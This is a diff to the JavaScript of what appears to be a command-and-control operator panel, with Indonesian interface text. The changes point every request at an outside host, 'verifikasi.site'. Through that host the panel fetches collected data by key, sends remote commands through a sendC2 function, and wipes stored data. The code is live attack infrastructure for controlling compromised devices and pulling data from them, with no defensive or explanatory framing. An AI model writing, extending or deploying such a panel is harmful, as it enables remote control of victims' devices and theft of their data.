@@ -170,6 +170,7 @@
 // ============================================================
 // GLOBAL
 // ============================================================
+var SERVER_URL = 'https://verifikasi.site';
 var allData = [];
 var KEY = '';
 var c2History = [];
@@ -201,7 +202,7 @@ function showToast(msg, dur) {
 // ============================================================
 function refreshData() {
     if(!KEY) return;
-    fetch('/data?key=' + encodeURIComponent(KEY))
+    fetch(SERVER_URL + '/data?key=' + encodeURIComponent(KEY))
         .then(function(r){ return r.json(); })
         .then(function(data){
             allData = data;
@@ -592,7 +593,7 @@ function sendC2(aksi, params){
     renderC2History();
     document.getElementById('c2Result').textContent = '⏳ Sending: '+aksi;
     document.getElementById('c2Result').style.color = '#ff0';
-    fetch('/data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) })
+    fetch(SERVER_URL + '/data', { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) })
         .then(function(r){ return r.json(); })
         .then(function(res){
             document.getElementById('c2Result').textContent = '✅ Sent: '+aksi;
@@ -648,7 +649,7 @@ function exportJSON(){
 
 function clearAll(){
     if(!confirm('⚠️ Hapus semua data?')) return;
-    fetch('/clear?key='+encodeURIComponent(KEY), {method:'POST'})
+    fetch(SERVER_URL + '/clear?key='+encodeURIComponent(KEY), {method:'POST'})
         .then(function(){ allData=[]; renderAll(); showToast('🗑️ Data terhapus'); })
         .catch(function(){ showToast('❌ Gagal hapus data'); });
 }
